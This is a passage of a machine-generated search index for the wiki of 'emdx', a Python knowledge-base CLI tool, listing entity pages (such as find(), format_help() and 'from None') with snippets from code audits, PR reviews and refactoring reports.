<li><code>emdx/commands/cascade.py</code> - typer.Exit handling in auto-run</li> <li><code>emdx/commands/recipe.py</code> - ValueError on non-numeric ID lookup</li> <li> <p>`emdx/services/ask_s...</p> </li> <li> <p>#6286 Delegate: DEBT-12: Fix overly broad exception catches</p> <p>This task specifically targets blocks that are NOT <code>except Exception: pass</code> (which is DEBT-5). ## Changes Made</p> </li> </ul>"},{"location":"entities/files-modified/#files-modified_12","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_13","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified_14","title":"Files Modified","text":""},{"location":"entities/files-modified/#files-modified-14-total","title":"Files Modified (14 total)","text":""},{"location":"entities/files-modified/#files-modified-8-files-8-exception-handlers","title":"Files Modified (8 files, 8 exception handlers)","text":"<ol> <li>emdx/services/unified_executor.py:465</li> <li> <p>Changed: <code>except Exception:</code> \u2192 `exce...</p> </li> <li> <p>#6256 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [19/37]</p> </li> </ol>"},{"location":"entities/files-modified/#dead-code-audit-implementation","title":"Dead Code Audit Implementation","text":""},{"location":"entities/files-modified/#summary_3","title":"Summary","text":"<p>Implemented the dead code cleanup from Document #6230 gameplan. ## Changes Made</p>"},{"location":"entities/files-modified/#files-modified-17-total","title":"Files Modified (17 total)","text":"<p>Commands: - cascade.py: Removed unused <code>Path</code> import - executions.py: Removed unused `fil...</p> <ul> <li>#4834 Parallel Analysis (Reusable) - Parallel_Explore Synthesis </li> </ul> File Changes Made `emdx/database/__in... <ul> <li>#4547 Tech Debt Parallel Fix - Tech_Debt_Parallel_Fix Synthesis   Section: Synthesis Log <p>...search fully implemented |\\n\\nOverall Progress: ~72% Complete\\n\\n---\\n\\n## Key Files Modified\\n\\nNew Files Created:\\n- <code>/emdx/utils/output.py</code> (8 lines)\\n- <code>/emdx/utils/cli.py</code> (40 lines)\\n\\nMajor Modifications:\\n- 13 command files updated for console...</p> </li> </ul>"},{"location":"entities/files-modified/#priority-3-consistent-test-patterns-low","title":"Priority 3: Consistent Test Patterns (Low)","text":"<p>Tests should use pytest fixtures from <code>conftest.py</code> rather than creating custom database instances. ## Files Modified (Complete List)</p>"},{"location":"entities/files-modified/#related-entities","title":"Related Entities","text":"<ul> <li><code>~1.75 hours</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>wrapup()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>tests/test_retry.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>sensitive hashing</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>retry_subprocess()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>raw json output</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>quiet mode (just summary)</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>preview what would be summarized</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>manual test</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>linting passes</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> </ul>"},{"location":"entities/files/","title":"files:","text":"<p>Type: concept | Mentioned in: 9 documents | First seen: 2026-02-14</p>"},{"location":"entities/files/#documents-9","title":"Documents (9)","text":"<ul> <li>#6580 Delegate: Check tests/ for mocks that use MagicMock() where a spec= wo [3/3]   Section: P0 \u2014 HIGH RISK: Mocks of domain classes with evolving APIs </li> <li>Files: <code>test_delegate_commands.py</code> (15+ instances), <code>test_unified_executor.py</code> (5 instances)</li> <li> <p>Risk: <code>UnifiedExecutor.execute()</code> is the core execution path. If `execu...</p> </li> <li> <p>#6540 Delegate: Fix issues found in PR #652 review (doc #6529 in emdx KB). T [3/3]   Section: 1. Fix <code>from None</code> to <code>from e</code> (B904 compliance)</p> <p>Files: <code>emdx/commands/recipe.py</code> (lines 202, 296)</p> </li> <li> <p>#6407 PR Evaluation: #567, #569, #572, #573, #575 vs mypy PR #588   Section: Detailed Analysis</p> </li> <li>Files: 9 (introduces <code>_helpers.py</code>, refactors <code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li>Overlap: 3 files (<code>browse.py</code>, <code>tags.py</code>, <code>trash.py</code>)</li> <li> <p>Issue: These 3 command...</p> </li> <li> <p>#6379 Codebase Bug Audit 2026-02-15 [10/10]   Section: MEDIUM SEVERITY ISSUES (8)</p> </li> <li><code>emdx/database/documents.py:200, 327, 381, 411</code></li> <li><code>emdx/models/tags.py:23, 60, 118, 163, 202, 381</code></li> <li> <p><code>emdx/models/tasks.py:60, 105</code></p> </li> <li> <p>#6378 Codebase Bug Audit 2026-02-15 [9/10]   Section: LOW Severity Issues (4 Found)</p> </li> <li><code>emdx/database/__init__.py:164</code></li> <li><code>emdx/database/__init__.py:332</code></li> <li><code>emdx/database/__init__.py:352</code></li> <li> <p><code>emdx/database/groups.py:155</code></p> </li> <li> <p>#6325 Delegate: Analyze emdx/database/ and emdx/models/ for architecture imp [4/10]   Section: 1. SQL Query Duplication</p> </li> <li> <p>#6306 Delegate: Analyze SEPARATION OF CONCERNS across emdx/ (exclude ui/ and [5/15]   Section: 1. CRITICAL: <code>models/</code> is Actually a Database Layer**</p> <p>Files: <code>models/tags.py</code>, <code>models/tasks.py</code>, <code>models/executions.py</code>, <code>models/documents.py</code></p> </li> <li> <p>#6225 Delegate: Audit BUILD/CI DEBT in the emdx project: Check GitHub Action [7/14]   Section: MEDIUM Findings</p> </li> <li><code>tests/test_file_watcher.py</code> - 11 instances with sleeps up to 1.0s</li> <li><code>tests/test_documents.py</code> - 3 instances</li> <li> <p>`tests/tes...</p> </li> <li> <p>#6219 Delegate: Audit TYPE SAFETY DEBT in the emdx project: Find missing typ [9/14]   Section: High Severity Issues (12)</p> </li> <li><code>emdx/services/cascade_service.py:62</code> uses `Dict[...</li> </ul>"},{"location":"entities/files/#1-mock_executor-magicmock-standing-in-for-unifiedexecutor","title":"1. <code>mock_executor = MagicMock()</code> standing in for <code>UnifiedExecutor</code>","text":""},{"location":"entities/files/#pr-567-command-helpers-refactor","title":"PR #567 - Command Helpers Refactor","text":""},{"location":"entities/files/#9-unchecked-cursorfetchone0-in-multiple-locations","title":"9. Unchecked <code>cursor.fetchone()[0]</code> in Multiple Locations","text":"<p>Files: </p>"},{"location":"entities/files/#5-dynamic-where-clause-construction","title":"5. Dynamic WHERE Clause Construction","text":"<p>Files: </p>"},{"location":"entities/files/#moderate-repeated-where-clauses","title":"Moderate: Repeated WHERE Clauses","text":"<p>Files: <code>documents.py</code>, <code>groups.py</code>, <code>cascade.py</code></p>"},{"location":"entities/files/#8-flaky-test-patterns-detected-medium","title":"8. Flaky Test Patterns Detected (MEDIUM)","text":"<p>Files: Multiple test files use <code>time.sleep()</code>:</p>"},{"location":"entities/files/#9-inconsistent-optional-syntax","title":"9. Inconsistent Optional syntax","text":"<p>Files: Multiple Issue: Mix of <code>Optional[X]</code>, <code>X | None</code>, and <code>Dict[str, Any] | None</code> across codebase Examples:</p>"},{"location":"entities/files/#related-entities","title":"Related Entities","text":"<ul> <li><code>database/search.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>database/cascade.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.0)</li> <li><code>run_migrations()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.2)</li> <li><code>sqlitedatabase</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.8)</li> <li><code>models/executions.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.6)</li> <li><code>save_document()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>risk:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>get_document()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.4)</li> <li><code>stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> <li><code>models/tags.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=4.1)</li> </ul>"},{"location":"entities/find/","title":"find()","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/find/#documents-8","title":"Documents (8)","text":"<ul> <li>#6609 Delegate: Investigate removing the emoji alias system from emdx. The s [1/2]   Section: 3. <code>emdx/commands/core.py</code> \u2014 MODERATE CHANGES** <p>...ng(tags_str)` before parsing comma-separated tags. Remove \u2014 parse directly.</p> </li> <li><code>find()</code> command (line 495): <code>expand_alias_string(tags)</code> for <code>--tags</code> filter. Remove.</li> <li> <p><code>find()</code> command (line 508): <code>expand_alias_string(no_tags)</code> for <code>--no-tags</code> filte...</p> </li> <li> <p>#6338 Architecture Improvements: Implementation Summary   Section: Remaining Opportunities (Not Implemented)</p> </li> <li>Rename <code>models/</code> to <code>repositories/</code> - would break many imports</li> <li>Decompose <code>find()</code> function (210 lines) - refactoring risk</li> <li> <p>Standardize return types (dict vs dataclass) - large-scale type changes</p> </li> <li> <p>#6330 Delegate synthesis [synthesis]   Section: Medium-Term (Higher Effort)</p> <ol> <li>Decompose <code>find()</code> function (210 lines \u2192 3-4 focused functions)</li> </ol> </li> <li> <p>#6323 Delegate: Analyze emdx/commands/ for architecture improvements. Focus  [1/10]   Section: 2. Overly Long Functions</p> </li> <li>Query parsing</li> <li>Tag filtering</li> <li>Date filtering</li> <li>Tag exclusion</li> <li>Multiple output formats (IDs only, JSON, table)</li> <li> <p>Batch tag fetching</p> </li> <li> <p>#6319 Codebase Quality Analysis \u2014 Synthesized Summary (2026-02-14)   Section: Tier 2: Complexity Hotspots (Readability)</p> <p>...ng | | <code>claude_wrapper.py:40</code> | <code>main()</code> | 117 | God function | | <code>core.py:340</code> | <code>find()</code> | 114 | 30 conditionals, 17 parameters | | <code>maintain.py</code> (4 functions) | various | 347 total | Wizard + cleanup mixed |</p> </li> <li> <p>#6309 Delegate: Analyze FUNCTION COMPLEXITY across emdx/ (exclude ui/ and tests/)   Section: Top 15 Worst Offenders (Ranked by Severity)</p> <p>...ess, output parsing, heartbeat | | 113.9 | 229 | 5 | <code>commands/core.py:340</code> | <code>find()</code> | 30 conditionals, complex tag/search/date filter combinations | | 102.1 | 96 | 9 | <code>services/unified_executor.py:41</code> | <code>format_stream_line()</code> | 9-level nesting...</p> </li> <li> <p>#6226 Delegate: Audit API/INTERFACE DEBT in the emdx CLI: Check all CLI comm [3/14]   Section: HIGH SEVERITY (API Inconsistency)</p> </li> <li><code>--tags \"tag1,tag2\"</code> (comma-separated string) - most commands</li> <li> <p><code>-t tag1 tag2</code> (space-separated list) - `delegate...</p> </li> <li> <p>#6152 PR Review: #454 Semantic Find Upgrade   Section: Code Quality Assessment</p> <p>...esults include tags via batch fetch (no N+1)</p> </li> <li>Code organization: Refactored <code>find()</code> to delegate keyword path to <code>_find_keyword_search()</code></li> </ul>"},{"location":"entities/find/#low-priority","title":"Low-Priority","text":""},{"location":"entities/find/#21-find-in-corepy-critical-210-lines-340-568","title":"2.1 <code>find()</code> in core.py (CRITICAL - 210 lines, 340-568)","text":"<p>This function handles:</p>"},{"location":"entities/find/#5-inconsistent-tag-input-formats","title":"5. Inconsistent Tag Input Formats","text":"<p>Location: <code>core.py:save()</code>, <code>find()</code>, <code>delegate.py</code> Issue: Tags can be passed as:</p>"},{"location":"entities/find/#related-entities","title":"Related Entities","text":"<ul> <li><code>_interactive_wizard()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>_cleanup_branches()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>parse_stream_json_line_rich()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>commands/_helpers.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.1)</li> <li><code>save()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>main()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>db.ensure_schema()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>_find_keyword_search()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>repositories/</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> <li><code>@ensure_schema</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.5)</li> </ul>"},{"location":"entities/formathelp/","title":"format_help()","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-22</p>"},{"location":"entities/formathelp/#documents-11","title":"Documents (11)","text":"<ul> <li> <p>#6839 Delegate: list   Section: 2. <code>emdx/utils/lazy_group.py</code> \u2014 Help text delegation</p> <p>Problem: <code>emdx delegate --help</code> showed incomplete help because <code>LazyCommand</code> didn't override <code>format_help()</code> \u2014 it used <code>click.MultiCommand</code>'s default instead of delegating to the real loaded command.</p> </li> <li> <p>#6837 Delegate: list [1/2]   Section: Fix: Delegate subcommand routing (<code>list</code>, <code>running</code>, <code>stats</code>, etc.)</p> <ol> <li><code>emdx/utils/lazy_group.py</code> (lines 163-166): Added <code>format_help()</code> to <code>LazyCommand</code> so that <code>--help</code> renders the full help text from the loaded real command, not just the placeholder.</li> </ol> </li> <li> <p>#6835 Delegate: list   Section: Changes on disk (uncommitted)</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so <code>--help</code> properly delegates to the real loaded command instead of showing empty help</p> </li> <li> <p>#6836 Delegate: list   Section: Changes</p> <p><code>emdx/utils/lazy_group.py</code> (1 change):</p> </li> <li> <p>Added <code>format_help()</code> to <code>LazyCommand</code> \u2014 delegates help formatting to the real loaded command, so <code>emdx delegate --help</code> properly shows the Commands section with all subcommands listed</p> </li> <li> <p>#6833 Delegate: list   Section: Summary</p> <p>...<code>emdx/utils/lazy_group.py</code> \u2014 Help delegation for lazy-loaded commands</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> so that <code>emdx delegate --help</code> properly delegates to the real (loaded) command's help formatter, showing the full help text including subcom...</p> </li> <li> <p>#6830 Delegate: --help [2/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> method to <code>LazyCommand</code> that delegates to the real loaded command, ensuring <code>emdx delegate --help</code> renders the full help text from the actual command rather than the lazy wrapper's stub.</p> </li> <li> <p>#6829 Delegate: --help [2/2]   Section: Summary</p> </li> <li> <p>#6789 Delegate: --help [2/2]</p> <p>...hortcut for --model sonnet)\" \u2192 \"Use Sonnet model\")</p> </li> <li> <p>LazyCommand fix \u2014 Added <code>format_help()</code> override in <code>LazyCommand</code> to delegate to the real command, ensuring rich markup renders correctly through the lazy-loading layer</p> </li> <li> <p>#6787 Delegate: list [1/2]</p> <p><code>emdx/utils/lazy_group.py</code>:</p> </li> <li> <p>Added <code>format_help()</code> override to <code>LazyCommand</code> so the Rich-formatted help renders correctly through the lazy proxy</p> </li> <li> <p>#6786 Delegate: --help [2/2]</p> <p>...ation\" panel, and tightened all option help strings.</p> </li> <li> <p><code>lazy_group.py</code>: Added <code>format_help()</code> override to <code>LazyCommand</code> so it delegates help formatting to the real command, enabling Rich markup to render through the lazy loading layer....</p> </li> <li> <p>#6785 Delegate: --help [2/2]   Section: Changes</p> </li> <li>Added <code>format_help()</code> override to <code>LazyCommand</code> \u2014 delegates help formatting to the real command, so Rich panels and markup render correctly through the lazy loading proxy</li> </ul>"},{"location":"entities/formathelp/#1-emdxutilslazy_grouppy-added-format_help-to-lazycommand","title":"1. <code>emdx/utils/lazy_group.py</code> \u2014 Added <code>format_help()</code> to <code>LazyCommand</code>","text":"<p>Previously, <code>LazyCommand</code> (a <code>click.MultiCommand</code>) didn't override <code>format_help()</code>, so when <code>--help</code> was invoked on a lazily-loaded command like `d...</p>"},{"location":"entities/formathelp/#emdxutilslazy_grouppy","title":"<code>emdx/utils/lazy_group.py</code>","text":""},{"location":"entities/formathelp/#related-entities","title":"Related Entities","text":"<ul> <li><code>lazycommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (11 shared docs, PMI=6.3)</li> <li><code>typer.typer()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>`emdx/utils/lazy_group.py</code>:` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>emdx delegate stats</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>click.multicommand</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>emdx/utils/lazy_group.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>1.</code>emdx/commands/delegate.py<code>\u2014 subcommand routing fix</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.3)</li> <li><code>import click</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.9)</li> <li><code>help=</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=5.9)</li> <li><code>`emdx/commands/delegate.py</code>:` \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.9)</li> </ul>"},{"location":"entities/from-none/","title":"from none","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-14</p>"},{"location":"entities/from-none/#documents-8","title":"Documents (8)","text":"<ul> <li>#6549 Delegate: Review PR #654 using 'gh pr view 654' and 'gh pr diff 654'.  [2/6]   Section: Summary <p>...ures don't mask original execution exceptions</p> </li> <li> <p>Fix B904 compliance: Changed <code>from None</code> to <code>from e</code> in recipe.py exception handlers to preserve the exception chain</p> </li> <li> <p>#6540 Delegate: Fix issues found in PR #652 review (doc #6529 in emdx KB). T [3/3]   Section: 1. Fix <code>from None</code> to <code>from e</code> (B904 compliance)</p> <p>Changed <code>raise typer.Exit(1) from None</code> to <code>raise typer.Exit(1) from e</code> in both exception handlers. This preserves the exception chain per B904 (flake8-bugbear) which requires using <code>from err</code> or `from No...</p> </li> <li> <p>#6529 Delegate: Review GitHub PR #652 using 'gh pr view 652' and 'gh pr diff [1/4]   Section: Issues &amp; Suggestions \ud83d\udd0d</p> <p>...console.print(f\"[red]Failed to parse recipe: {e}[/red]\")     raise typer.Exit(1) from None  # Should be <code>from e</code> per B904 <code>`` The</code>from None<code>suppresses the cause chain. Per the project's B904 rule, should be</code>from e<code>or have an explicit reason for</code>from N...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: What's Obsolete / Changed Since PR #453</p> <ol> <li><code>from None</code> syntax \u2014 Current code uses <code>raise typer.Exit(1) from None</code> consistently; PR used bare <code>raise typer.Exit(1)</code>. Should use <code>from None</code> per codebase conventions.</li> </ol> </li> <li> <p>#6382 Codebase Bug Audit 2026-02-15 [synthesis]   Section: 1. Inconsistent Exception Chaining</p> <p>Most files properly use <code>from err</code> or <code>from None</code>, but cascade.py and some CLI commands have bare <code>raise typer.Exit(1)</code> without context.</p> </li> <li> <p>#6381 Codebase Bug Audit 2026-02-15 [8/10]   Section: Executive Summary</p> <p>The codebase demonstrates generally good error handling practices with proper use of <code>from err</code>/<code>from None</code> in most re-raises, appropriate exception logging, and graceful degradation patterns. However, there are several areas for improvement.</p> </li> <li> <p>#6374 Codebase Bug Audit 2026-02-15 [2/10]   Section: Low Severity Bugs</p> <p>...t exception chaining File: ask.py Line: 95 Issue: <code>raise typer.Exit(1) from None</code> is used but the context is \"No relevant documents found\" which isn't an error condition that needs suppression. Using <code>from None</code> unnecessarily. Impact: Minor;...</p> </li> <li> <p>#6293 Delegate: DEBT-14: Fix ruff violations - 1071 fixes applied   Section: Manually Fixed (38 fixes)</p> <p>Exception Chaining (B904 - 22 fixes):</p> </li> <li>Added <code>from None</code> to all <code>raise typer.Exit(1)</code> statements in except blocks</li> <li>Files: ask.py, delegate.py, groups.py, cli_executor/factory.py, embedding_service.py</li> </ul>"},{"location":"entities/from-none/#related-entities","title":"Related Entities","text":"<ul> <li><code>raise typer.exit(1) from none</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>from err</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>total issues found:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>review issues</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>recipe_parser.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>raise typer.exit(1) from e</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>emdx/services/recipe_executor.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>[--timeout 1800]</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>from e</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.5)</li> <li><code>timeout</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> </ul>"},{"location":"entities/full-text-search/","title":"full-text search","text":"<p>Type: concept | Mentioned in: 9 documents | First seen: 2025-07-07</p>"},{"location":"entities/full-text-search/#documents-9","title":"Documents (9)","text":"<ul> <li>#6761 Obsidian Publish and Wiki Generation UX Research   Section: 4. Obsidian Publish: Vault to Wiki Transformation <p>...ottom</p> </li> <li>Hover previews \u2014 hover over a link to see content (like Wikipedia)</li> <li>Full-text search</li> <li>Navigation sidebar \u2014 configurable, folder-based</li> <li>Custom CSS \u2014 themes, custom styles</li> <li>Custom domains \u2014 CNAME to your own domain</li> <li> <p>Collaborators...</p> </li> <li> <p>#6191 Delegate: analysis [3/3]   Section: Project Overview</p> <p>...agement System) is a powerful knowledge base CLI tool built in Python. It provides full-text search, tagging, project organization, and multiple interfaces for managing and accessing a local SQLite-based knowledge base.</p> </li> <li> <p>#4754 Parallel Analysis (Reusable) - Parallel_Explore Synthesis   Section: Common Themes Across All Analyses</p> <p>...| CLI framework | | Textual | 4.0.0 | TUI framework | | SQLite + FTS5 | Built-in | Full-text search database | | Claude API | claude-opus-4-5-20251101 | AI execution |</p> </li> <li> <p>#289 README   Section: emdx - Documentation Index Management System</p> <p>A powerful command-line tool for managing your personal knowledge base with SQLite full-text search, Git integration, and a beautiful terminal interface.</p> </li> <li> <p>#250 Claude-KB Competitive Analysis - Innovation Assessment   Section: Market Gap Analysis</p> <p>...session</p> </li> <li>Centralized Storage: All knowledge in one searchable database</li> <li>Full-Text Search: Find anything with <code>claude-find</code></li> <li> <p>Seamless Workflow: Works within existing Claude Code flow</p> </li> <li> <p>#276 CLAUDE-KNOWLEDGE-SYSTEM-DESIGN   Section: MVP Features (Phase 1)</p> </li> <li> <p>#157 SQLite vs PostgreSQL - What You Really Lose   Section: 1. Full-Text Search Quality**</p> <p>PostgreSQL: ```sql -- Rich full-text search with ranking, stemming, multiple languages SELECT      id,     ts_rank(search_vector, plainto_tsquery('english', 'docker compose')) as rank,     ts_headline('english...</p> </li> <li> <p>#176 Project Overview Documentation   Section: 2. Fish Shell Functions</p> <p>...files to knowledge base</p> </li> <li><code>claude-list</code> - List knowledge entries</li> <li><code>claude-find</code> - Full-text search capabilities</li> <li><code>claude-view</code> - View documents with mdcat</li> <li><code>claude-recent</code> - Show recently accessed documents</li> <li> <p><code>claude-stats</code> - Display knowledge base statistics</p> </li> <li> <p>#183 CLAUDE-SCALE-TO-MILLIONS   Section: Current Bottlenecks at Scale</p> <ol> <li>Tab Completion - SQL queries on every TAB press</li> </ol> </li> <li>Full-text Search - Single GIN index gets huge</li> <li>Project/Tag Queries - Sequential scans on millions</li> <li>View Performance - Loading full content every time</li> </ul>"},{"location":"entities/full-text-search/#search","title":"Search","text":"<p>claude-search \"docker\"     # Full-text search claude-tags \"api\"         # By tag claude-project \"myapp\"    # By project</p>"},{"location":"entities/full-text-search/#related-entities","title":"Related Entities","text":"<ul> <li><code>view by id</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>tab completion</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.6)</li> <li><code>save from clipboard</code> 